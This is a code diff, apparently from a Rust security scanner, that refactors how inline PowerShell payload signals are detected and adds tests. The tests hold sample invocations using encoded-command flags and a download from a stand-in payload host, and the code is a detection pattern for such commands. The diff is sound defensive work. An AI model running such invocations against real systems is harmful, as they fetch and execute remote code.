@@ -3233,6 +3233,25 @@ mod herestring_iex_tests {
         let text = "powershell.exe -enc AAAA";
         assert!(inline_powershell_text_has_payload_signal(text));
     }
+
+    #[test]
+    fn inline_powershell_gate_allows_short_encoded_invocation() {
+        let text = "powershell.exe -e AAAA";
+        assert!(inline_powershell_text_has_payload_signal(text));
+    }
+
+    #[test]
+    fn inline_powershell_gate_allows_canonicalized_payload_shortcuts() {
+        for text in [
+            "powershell.exe -ec AAAA",
+            "pwsh /co Invoke-WebRequest https://payload.example/a",
+        ] {
+            assert!(
+                inline_powershell_text_has_payload_signal(text),
+                "missed shortcut: {text}"
+            );
+        }
+    }
 }
 
 /// Walk every entry in `env.all_extracted_ps1` looking for a one-shot
@@ -3612,16 +3631,19 @@ fn inline_powershell_text_has_payload_signal(lower: &str) -> bool {
 
     lower.lines().any(|line| {
         (line.contains("powershell") || line.contains("pwsh"))
-            && (line.contains("-enc")
-                || line.contains("/enc")
-                || line.contains("-encodedcommand")
-                || line.contains("/encodedcommand")
-                || line.contains("-command")
-                || line.contains("/command")
-                || line.contains(" -c ")
-                || line.contains(" /c ")
+            && (line_has_powershell_payload_flag(line)
                 || line.contains("http://")
                 || line.contains("https://")
                 || line.contains("iex "))
+    })
+}
+
+fn line_has_powershell_payload_flag(line: &str) -> bool {
+    line.split_whitespace().any(|token| {
+        let token = token.trim_matches(['"', '\'', '`', ',', ';', ')', '(']);
+        matches!(
+            crate::handlers::powershell::canonical_ps_flag(token),
+            Some("EncodedCommand" | "Command")
+        )
     })
 }
